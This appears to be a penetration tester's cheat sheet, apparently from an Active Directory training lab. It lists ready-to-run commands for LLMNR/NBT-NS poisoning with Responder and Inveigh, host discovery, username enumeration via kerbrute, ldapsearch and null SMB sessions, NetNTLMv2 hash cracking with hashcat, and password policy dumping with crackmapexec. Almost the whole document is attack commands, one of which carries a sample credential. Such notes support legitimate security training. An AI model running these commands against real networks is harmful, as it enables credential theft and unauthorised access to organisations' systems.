## LLMNR/NBT-NS Poisoning
### Identifying Hosts
------------------From linux host-------------------
#### Responder
- Listening network traffic and capture
`sudo responder -I ens224 -A`

#### FPing Active Checks
- Check alive hosts via ping
`fping -asgq 172.16.5.0/23`



### Internal AD Username Enumeration NULL section
#### Kerbrute 
`kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users.txt`
- Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested

### windapsearch
`./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`

### ldapsearch
`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`

#### Hashcat
`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

-------------------From windows host----------------
#### Inveigh 
- Listening network traffic and capture
`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`

### SMB NULL Session to Pull User List
`enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
`crackmapexec smb 172.16.5.5 --users`

## Enumerating the Password Policy
- Check Lockout threshold, Minimum password length, Lockout duration
### From Linux - Credentialed
`crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`

### From Linux - SMB NULL Sessions
`enum4linux -P 172.16.5.5`
